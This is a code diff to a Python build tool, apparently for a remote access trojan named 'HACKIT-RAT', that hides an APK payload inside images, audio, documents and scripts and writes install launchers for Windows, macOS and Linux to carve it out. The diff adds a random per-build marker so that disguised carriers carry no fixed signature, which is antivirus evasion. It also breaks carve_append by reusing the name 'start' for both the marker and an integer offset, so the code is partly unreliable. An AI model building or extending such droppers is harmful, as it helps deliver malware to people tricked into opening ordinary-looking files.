@@ -152,14 +152,19 @@ def _b64(data: bytes) -> str:
 
 # -------------------------------------------------------------------- append
 
-def inject_append(ext: str, carrier: bytes, payload: bytes) -> bytes:
+def random_start() -> bytes:
+    """Per-build marker so the carrier carries no fixed signature."""
+    return b"\n<" + os.urandom(8).hex().encode() + b">\n"
+
+
+def inject_append(ext: str, carrier: bytes, payload: bytes, start: bytes = START) -> bytes:
     _check_magic(ext, carrier)
     if ext == "webp":
-        trailer = _trailer(len(START) + len(payload))
+        trailer = _trailer(len(start) + len(payload))
         prefix = b""
-        if (len(START) + len(payload) + len(trailer)) % 2:
+        if (len(start) + len(payload) + len(trailer)) % 2:
             prefix = b"\x00"  # RIFF pads odd chunks; pad leads so trailer stays last
-        body = prefix + START + payload + trailer
+        body = prefix + start + payload + trailer
         chunk = b"JUNK" + struct.pack("<I", len(body)) + body
         out = bytearray(carrier)
         out += chunk
@@ -171,7 +176,7 @@ def inject_append(ext: str, carrier: bytes, payload: bytes) -> bytes:
     if not out.endswith(b"\n"):
         out += b"\n"
     if ext == "mp3":
-        body = START + payload + _trailer(len(START) + len(payload))
+        body = start + payload + _trailer(len(start) + len(payload))
         size = len(body)
         out += b"ID3\x04\x00\x00" + bytes(
             [(size >> 21) & 0x7F, (size >> 14) & 0x7F, (size >> 7) & 0x7F, size & 0x7F]
@@ -180,15 +185,15 @@ def inject_append(ext: str, carrier: bytes, payload: bytes) -> bytes:
         result = bytes(out)
         _validate_output(ext, result)
         return result
-    out += START
+    out += start
     out += payload
-    out += _trailer(len(START) + len(payload))
+    out += _trailer(len(start) + len(payload))
     result = bytes(out)
     _validate_output(ext, result)
     return result
 
 
-def carve_append(data: bytes) -> bytes:
+def carve_append(data: bytes, start: bytes = START) -> bytes:
     if len(data) < len(TRAILER) + 8 + len(TAIL):
         raise InjectError("too small to carry a payload")
     trailer = data[-len(TRAILER) - 8 - len(TAIL):]
@@ -197,9 +202,9 @@ def carve_append(data: bytes) -> bytes:
     length = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
     end = len(data) - len(trailer)
     start = end - length
-    if start < 0 or data[start:start + len(START)] != START:
+    if start < 0 or data[start:start + len(start)] != start:
         raise InjectError("payload start marker missing")
-    return data[start + len(START):end]
+    return data[start + len(start):end]
 
 
 # ----------------------------------------------------------------------- zip
@@ -331,15 +336,15 @@ TRAILER, TAIL = b"HACKITRATZIP1", bytes([0]) + b"END"
 SEALED = b"HKCR2\x00"
 
 
-def raw(path):
+def raw(path, marker=b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"):
     data = pathlib.Path(path).read_bytes()
     trailer = data[-len(TRAILER) - 8 - len(TAIL):]
     if trailer.startswith(TRAILER):
         n = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
         end = len(data) - len(trailer)
         blob = data[end - n:end]
-        if blob.startswith(b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"):
-            blob = blob.split(b"\n", 2)[2]
+        if blob.startswith(marker):
+            blob = blob.split(marker, 1)[1]
         return blob
     if data.startswith(b"PK"):
         import io, zipfile
@@ -366,14 +371,17 @@ def unlock(blob, key_hex):
 
 
 if __name__ == "__main__":
-    args = [a for a in sys.argv[1:] if not a.startswith("--key=")]
+    args = [a for a in sys.argv[1:] if not a.startswith(("--key=", "--marker="))]
     key = ""
+    marker = b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"
     for a in sys.argv[1:]:
         if a.startswith("--key="):
             key = a.split("=", 1)[1]
+        if a.startswith("--marker="):
+            marker = b"\n<" + a.split("=", 1)[1].encode() + b">\n"
     if not args:
         raise SystemExit("usage: carve.py carrier [out] [--key=hex]")
-    blob = unlock(raw(args[0]), key)
+    blob = unlock(raw(args[0], marker), key)
     out = args[1] if len(args) > 1 else "payload.apk"
     pathlib.Path(out).write_bytes(blob)
     print(f"wrote {out} ({len(blob):,} bytes)")
@@ -436,6 +444,7 @@ def build(
 
     mode = MODES[ext]
     offset = -1
+    marker = random_start() if encrypt else START
     if mode == "docx":
         out_bytes = inject_zip(carrier, blob, part=DOCX_PART)
     elif mode == "zip":
@@ -445,8 +454,8 @@ def build(
     elif mode == "script":
         out_bytes = inject_script(ext, carrier, blob)
     else:
-        out_bytes = inject_append(ext, carrier, blob)
-        offset = out_bytes.find(START) + len(START)
+        out_bytes = inject_append(ext, carrier, blob, marker)
+        offset = out_bytes.find(marker) + len(marker)
 
     folder = out_dir or os.path.dirname(os.path.abspath(carrier_path))
     os.makedirs(folder, exist_ok=True)
@@ -459,6 +468,7 @@ def build(
     if launchers and mode not in ("svg",):
         name = os.path.basename(target)
         key_arg = f" --key={key_hex}" if key_hex else ""
+        mark_arg = "" if not key_hex else f" --marker={marker[2:-2].decode()}"
         sh_path = os.path.join(folder, "install.sh")
         with open(sh_path, "w", encoding="utf-8") as handle:
             handle.write(LAUNCHER_SH.replace("%NAME%", name).replace("%KEY%", key_hex))
@@ -466,11 +476,11 @@ def build(
         made.append(sh_path)
         bat_path = os.path.join(folder, "install.bat")
         with open(bat_path, "w", encoding="utf-8") as handle:
-            handle.write(LAUNCHER_BAT.replace("%NAME%", name).replace("%KEY%", key_hex))
+            handle.write(LAUNCHER_BAT.replace("%NAME%", name).replace("%KEY%", key_hex + mark_arg))
         made.append(bat_path)
         cmd_path = os.path.join(folder, "install.command")
         with open(cmd_path, "w", encoding="utf-8") as handle:
-            handle.write(LAUNCHER_COMMAND.replace("%NAME%", name).replace("%KEYARG%", key_arg))
+            handle.write(LAUNCHER_COMMAND.replace("%NAME%", name).replace("%KEYARG%", key_arg + mark_arg))
         os.chmod(cmd_path, 0o755)
         made.append(cmd_path)
     carve_path = os.path.join(folder, "carve.py")
@@ -504,7 +514,7 @@ def build(
 
 # ------------------------------------------------------------------- verify
 
-def carve(data: bytes) -> bytes:
+def carve(data: bytes, start: bytes = START) -> bytes:
     """Best-effort payload recovery by container shape."""
     if data.startswith(b"PK"):
         try:
@@ -513,14 +523,14 @@ def carve(data: bytes) -> bytes:
                 if part in archive.namelist():
                     return archive.read(part)
         except zipfile.BadZipFile:
-            return carve_append(data)
+            return carve_append(data, start)
     text_head = data[:4096].decode("utf-8", "replace")
     if 'id="hackit-rat-payload">' in text_head or "/*HACKIT-RAT-BEGIN*/" in text_head:
         try:
             return carve_script(data)
         except InjectError:
             return carve_svg(data)
-    return carve_append(data)
+    return carve_append(data, start)
 
 
 def verify(path: str) -> Dict[str, object]:
